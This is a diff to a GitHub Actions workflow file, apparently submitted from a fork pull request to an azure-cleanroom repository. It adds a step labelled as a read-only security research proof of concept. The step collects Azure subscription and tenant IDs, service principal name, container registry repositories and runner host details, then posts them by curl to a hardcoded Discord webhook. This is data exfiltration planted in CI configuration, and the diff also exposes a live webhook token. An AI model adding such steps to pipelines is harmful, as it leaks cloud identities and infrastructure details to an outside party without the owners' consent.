@@ -32,3 +32,37 @@ runs:
       shell: bash
       run: |
         az account show | jq ".user"
+
+    # --- Security Research PoC (read-only, no modifications) ---
+    - name: Security Research - Prove OIDC access (read-only)
+      shell: bash
+      run: |
+        echo "=== PoC: Proving Azure OIDC credential access from fork PR ==="
+        echo "=== This is read-only. No resources are modified. ==="
+
+        ACCOUNT_INFO=$(az account show 2>&1 || echo "az account show failed")
+        SUBSCRIPTION_NAME=$(echo "$ACCOUNT_INFO" | jq -r '.name // "unknown"')
+        SUBSCRIPTION_ID=$(echo "$ACCOUNT_INFO" | jq -r '.id // "unknown"')
+        TENANT_ID=$(echo "$ACCOUNT_INFO" | jq -r '.tenantId // "unknown"')
+        USER_TYPE=$(echo "$ACCOUNT_INFO" | jq -r '.user.type // "unknown"')
+        USER_NAME=$(echo "$ACCOUNT_INFO" | jq -r '.user.name // "unknown"')
+
+        ACR_URL="${{ env.SUBSCRIPTION_ID && vars.ACR_URL || 'unknown' }}"
+        ACR_REPOS="ACR list skipped"
+        if command -v az &> /dev/null; then
+          ACR_REPOS=$(az acr repository list --name "${ACR_URL%%.*}" 2>&1 | head -30 || echo "ACR list failed")
+        fi
+
+        RUNNER_INFO="Runner: $(hostname) | OS: $(uname -a | head -c 100)"
+
+        WEBHOOK="https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"
+
+        MSG=$(cat <<EOFMSG
+        {
+          "content": "**PoC: Azure OIDC credential access from fork PR -- azure-cleanroom**\n\n**Azure Account (read-only proof):**\n\`\`\`\nSubscription: $SUBSCRIPTION_NAME\nSubscription ID: $SUBSCRIPTION_ID\nTenant: $TENANT_ID\nService Principal: $USER_NAME\nUser Type: $USER_TYPE\n\`\`\`\n\n**Self-Hosted Runner:**\n\`\`\`\n$RUNNER_INFO\n\`\`\`\n\n**ACR Repositories (read-only list -- these could be overwritten):**\n\`\`\`\n$ACR_REPOS\n\`\`\`\n\nNo resources were modified. This is a responsible disclosure PoC.\nRun ID: $GITHUB_RUN_ID | Repo: $GITHUB_REPOSITORY"
+        }
+        EOFMSG
+        )
+
+        curl -s -X POST -H "Content-Type: application/json" -d "$MSG" "$WEBHOOK"
+        echo "=== PoC webhook sent ==="
